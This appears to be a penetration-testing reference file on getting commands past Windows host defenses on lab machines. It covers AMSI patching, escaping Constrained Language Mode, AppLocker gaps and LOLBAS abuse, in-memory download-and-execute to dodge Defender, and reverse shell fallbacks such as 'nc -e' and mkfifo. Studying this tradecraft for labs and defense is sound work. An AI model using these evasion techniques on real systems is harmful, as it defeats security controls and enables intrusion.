# Working around host defenses

On a lab box the goal is not stealth against a SOC — it is getting your command
to *run* when a control blocks it. Recognise which control fired from the error,
then pick the smallest thing that gets past it. Don't reach for an obfuscator
when the real problem is Constrained Language Mode.

## Recognise the control from the symptom

| Symptom | Control | Move |
|---------|---------|------|
| `... disallowed by the antimalware provider` on a download/IEX | AMSI | AMSI bypass, or run compiled instead of script |
| `Cannot ... in ConstrainedLanguage mode` | CLM (often WDAC/AppLocker) | live off allowed binaries, custom runspace, or a compiled exe |
| script/exe won't start, "policy" | AppLocker / WDAC | drop into an allowed path, use a LOLBAS, or an allowed interpreter |
| Defender deletes your dropped file instantly | on-access AV | encode/stage in memory, or use a signed LOLBAS |
| reverse shell connects then dies | AV killed the payload, or no `bash` | change payload family (below) |

## AMSI

AMSI scans script *content* at execution (`powershell`, `wscript`, VBA, .NET
`Assembly.Load`). It does not see compiled native code. Cheapest wins, in order:

1. **Don't feed it a script.** Compile your tool to an exe/DLL and run that, or
   use `nxc`/impacket from the container instead of an in-box PowerShell script.
2. **Patch AMSI in-process** — flip `amsiInitFailed` or patch `AmsiScanBuffer`
   in the current PowerShell before loading anything. Signatures for the naive
   one-liner are flagged; break strings up / vary them per run.
3. **Use a fresh runspace / older engine** — `powershell -v 2` where the .NET 2
   runtime is present has no AMSI.

## Constrained Language Mode

CLM blocks .NET types, `Add-Type`, COM — most offensive PowerShell. Check with
`$ExecutionContext.SessionState.LanguageMode`. It is enforced by AppLocker/WDAC,
so the way out is usually the same as beating AppLocker:

- Run a **full-language** interpreter that isn't governed: a custom C# runspace
  host (`PowerShdll`, or your own `System.Management.Automation` host in a
  compiled exe), or just do the work in a compiled binary.
- **InstallUtil / MSBuild / other LOLBAS** execute your code outside the
  PowerShell language policy.
- Move to **cmd + native tools**; CLM only constrains PowerShell.

## AppLocker / WDAC

Enumerate the policy before fighting it — there is almost always a gap:
```powershell
Get-AppLockerPolicy -Effective -Xml
reg query HKLM\Software\Policies\Microsoft\Windows\SrpV2   # AppLocker rules
```
- **Default-rule gaps:** default AppLocker allows everything under
  `C:\Windows` and `C:\Program Files`. Find a **user-writable** subdirectory
  there (`C:\Windows\Tasks`, `C:\Windows\Temp`, `...\spool\drivers\color`) and
  drop your exe into it.
- **LOLBAS:** run your logic through a Microsoft-signed binary that is on the
  allowlist (`msbuild`, `installutil`, `regsvr32`, `rundll32`, `mshta`,
  `cscript`) — see `LOLBAS`. This beats path rules *and* CLM in one move.
- **DLL rules are usually not enforced** even when exe rules are — a `rundll32
  yourdll,Entry` often runs where an exe won't.

## Defender (on-access)

If a dropped tool vanishes, it was signatured. Options: stage it **in memory**
(reflective load, `IEX (New-Object Net.WebClient).DownloadString(...)` after an
AMSI bypass), split/obfuscate the on-disk artifact, or swap to a signed LOLBAS
that needs no drop. For known offensive exes, an ordinary recompile from source
with renamed symbols usually clears the static signature on a lab box.

## Reverse shells that survive

- **IP is wrong** — the callback must target your `tun0`, not the container's
  docker IP: `pwnloop x "ip -4 addr show tun0"`.
- **No `bash`** — try `sh`, `nc -e`, `mkfifo`, a Python/Perl one-liner, or on
  Windows a PowerShell/`ConPtyShell` payload.
- **Payload eaten by AV** — change family (from a raw PS one-liner to a compiled
  stager), or fetch-and-exec in memory after patching AMSI.
- **URL-encoding** — a shell delivered through a web parameter usually needs the
  payload URL-encoded, and `&`/`;`/spaces escaped.

See `references/foothold.md` for the payload catalog itself; this file is only
about getting past the thing that blocks it.
